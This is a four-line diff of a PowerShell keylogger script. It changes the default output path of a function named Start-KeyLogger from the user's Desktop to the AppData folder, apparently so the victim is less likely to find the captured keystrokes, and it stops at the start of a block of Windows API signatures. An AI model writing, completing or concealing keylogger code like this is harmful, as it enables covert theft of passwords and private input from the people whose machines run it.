@@ -1,4 +1,4 @@
-function Start-KeyLogger($Path="C:\Users\" + (Get-Item env:\USERNAME).value + "\Desktop\k.txt") 
+function Start-KeyLogger($Path="C:\Users\" + (Get-Item env:\USERNAME).value + "\appdata\k.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
